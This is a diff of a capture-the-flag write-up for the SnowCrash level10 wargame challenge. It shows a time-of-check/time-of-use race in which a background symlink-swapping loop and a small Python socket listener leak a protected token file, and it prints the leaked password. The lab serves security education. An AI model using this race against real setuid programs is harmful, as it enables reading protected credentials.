@@ -10,17 +10,18 @@ level10@SnowCrash:~$ strings level10
 Connecting to %s:6969 ..
 …
 
+********************************************************************************
 With gdb we disassemble main and we see that the program calls access and open.
 On the man page of access we can read :
        Warning: Using these calls to check if a user is authorised to,
        for example, open a file before actually doing so using open(2)
        creates a security hole, because the user might exploit the short
-       time interval between checking and opening the file to manipulate
-       it.
+       time interval between checking and opening the file to manipulate it.
 
 So we will do just that to access token.
 
 But we have to first write a little program to create a server on port 6969 to get the content of token.
+********************************************************************************
 
 import socket
 
@@ -41,16 +42,24 @@ while True:
             break
     break
 
-We create a file toto who will have read permission.
+********************************************************************************
+We create a file toto that will have read permission.
+********************************************************************************
 
 level10@SnowCrash:~$ touch /tmp/toto
 level10@SnowCrash:~$ chmod +r /tmp/toto
 
-Then we will create a symbolic link on /tmp/toto and on the token successively in a loop, so we can access /tmp/toto but open token when we pass the symbolic link to level10. 
+********************************************************************************
+Then we will create a symbolic link on /tmp/toto and on the token successively
+in a loop, so we can access /tmp/toto but open token when we pass the symbolic
+link to level10. 
+********************************************************************************
 
 level10@SnowCrash:~$ $(while true; do ln -sf /tmp/toto /tmp/falsegod; ln -sf /home/user/level10/token /tmp/falsegod; done)&
 
+********************************************************************************
 The & permit us to keep this process in the background.
+********************************************************************************
 
 level10@SnowCrash:~$ ./level10 /tmp/falsegod [ip]
 Connecting to [ip]:6969 .. Connected!
@@ -64,7 +73,9 @@ recu: "b'.*( )*.\n'"
 recu: "b'woupa2yuojeeaaed06riuj63c\n'"
 recu: "b''"
 
+********************************************************************************
 This password works also for su flag11 !!
+********************************************************************************
 
 level10@SnowCrash:~$ su flag10
 Password: woupa2yuojeeaaed06riuj63c
